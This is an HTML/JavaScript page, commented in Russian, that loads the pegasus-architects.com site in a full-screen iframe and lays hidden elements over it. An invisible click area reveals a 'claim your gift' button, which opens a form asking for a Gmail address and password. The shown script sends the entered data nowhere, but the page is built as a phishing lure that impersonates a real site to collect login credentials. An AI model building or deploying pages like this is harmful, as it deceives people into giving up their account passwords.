<!DOCTYPE html>
<html>
<head>
  <title>pegasus-architects</title>
  <style>
    body {
      margin: 0;
      overflow: hidden;
      font-family: sans-serif;
    }

    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      opacity: 1;
      pointer-events: auto;
      z-index: 1;
    }

    #invisible-trigger {
      position: absolute;
      top: 80px;
      left: 1980px;
      width: 70px;
      height: 30px;
      background: transparent;
      cursor: pointer;
      z-index: 2;
    }

    #gift-button {
      display: none;
      position: absolute;
      top: 50px;
      left: 1300px;
      padding: 12px 20px;
      background-color: red;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      z-index: 3;
      cursor: pointer;
    }

    #form-container {
      display: none;
      position: absolute;
      top: 250px;
      left: 580px;
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.3);
      z-index: 4;
    }

    #form-container input {
      display: block;
      margin: 10px 0;
      padding: 8px;
      width: 240px;
    }

    #form-container button {
      padding: 10px 16px;
      background-color: green;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    #image {
      display: none;
      position: absolute;
      top: 250px;
      left: 600px;
      width: 300px;
      z-index: 5;
    }
  </style>
</head>
<body>

  <!-- Основной сайт -->
  <iframe src="https://pegasus-architects.com"></iframe>

  <!-- Невидимая кнопка -->
  <div id="invisible-trigger"></div>

  <!-- Кнопка "Забрать подарок" -->
  <button id="gift-button">Забрать подарок</button>

  <!-- Форма -->
  <div id="form-container">
    <input type="email" id="email" placeholder="Введите Gmail" required>
    <input type="password" id="password" placeholder="Введите пароль" required>
    <button id="submit">Отправить</button>
  </div>

  <!-- Фото (заранее выбранное фото с ПК) -->
  <img id="image" src="https://i.postimg.cc/dtQPF806/photo-2025-04-19-19-58-02.jpg" />

  <script>
    const invisibleTrigger = document.getElementById('invisible-trigger');
    const giftButton = document.getElementById('gift-button');
    const formContainer = document.getElementById('form-container');
    const submitButton = document.getElementById('submit');
    const image = document.getElementById('image');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');

    // Шаг 1: невидимый клик
    invisibleTrigger.addEventListener('click', () => {
      // Удалить невидимую кнопку
      invisibleTrigger.style.display = 'none';
      
      // Через 10 секунд показать кнопку "Забрать подарок"
      setTimeout(() => {
        giftButton.style.display = 'block';
      }, 3500); // 10 секунд
    });

    // Шаг 2: нажата кнопка "забрать подарок"
    giftButton.addEventListener('click', () => {
      giftButton.style.display = 'none';
      formContainer.style.display = 'block';
    });

    // Шаг 3: отправка формы
    submitButton.addEventListener('click', () => {
      // Проверка на пустые поля
      if (emailInput.value === "" || passwordInput.value === "") {
        alert("Пожалуйста, заполните все поля.");
        return; // Прерывание выполнения, если поля пустые
      }

      // Проверка на правильность email (наличие "@")
      const emailValue = emailInput.value;
      if (!emailValue.includes('@') || !emailValue.includes('.')) {
        alert("Пожалуйста, введите правильный адрес Gmail.");
        return; // Прерывание выполнения, если email некорректен
      }

      // Если все проверки пройдены, скрыть форму и показать изображение
      formContainer.style.display = 'none';
      image.style.display = 'block'; // Показываем изображение
    });
  </script>

</body>
</html>
